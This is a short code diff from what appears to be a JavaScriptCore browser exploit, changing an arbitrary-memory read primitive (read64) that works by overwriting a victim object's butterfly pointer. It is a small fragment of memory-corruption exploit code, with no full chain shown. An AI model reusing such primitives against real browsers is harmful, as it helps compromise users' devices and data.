@@ -607,7 +607,8 @@ var VM_PROT_EXECUTE = 0x4
         read64(addr) {
             // Set butterfly of victim object and dereference.
             hax[1] = Add(addr, new Int64(0x10)).asDouble();
-            return this.addrof(victim.pointer);
+            //return this.addrof(victim.pointer);
+            return victim.pointer;
         },
         read: function(addr, length) {
             var a = new Array(length);
